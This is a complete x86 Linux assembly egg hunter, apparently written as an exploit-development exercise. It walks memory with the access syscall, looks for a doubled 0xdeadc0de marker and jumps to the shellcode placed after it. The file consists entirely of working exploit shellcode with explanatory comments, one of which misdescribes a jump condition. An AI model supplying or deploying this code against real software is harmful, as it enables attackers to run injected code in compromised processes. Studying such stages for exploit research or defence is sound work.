global _start


section .text


_start:

	; Load our "egg" into ESI
	mov esi, 0xdeadc0de

following_page:
	
	or dx, 0xfff ; Load 4095 into dx

test_next:
	inc edx ; Make EDX "4096"
	mov al, 33 ; set the value of the access syscall
	lea ebx, [edx + 0x8] ; Load the address of the following 8 bytes
	int 0x80 ; Start the check if the memory is accessible


	cmp al, 0xf2 ; Compares the syscall value of access, and the value of the EFAULT error
	je short following_page ; If not equal, go back and check the follwing memory page

	cmp [edx], esi ; If memory can be accessed, check for the egg inside ESI
	jnz short test_next ; Go back and keep testing if the egg wasn't found
	
	lea ebx, [edx + 0x4] ; If the first part of the egg is found, load the next DWORD into ebx
	cmp [ebx], esi ; Compare the DWORD to the first part of the EGG
	jnz short test_next ; Go back if the next DWORD does not contain the egg (this is to avoid false positives).

	lea edx, [ebx + 0x4] ; If the second part of the egg is found, load that memory address, since our shellcode is what follows.
	jmp edx ; Execute shellcode

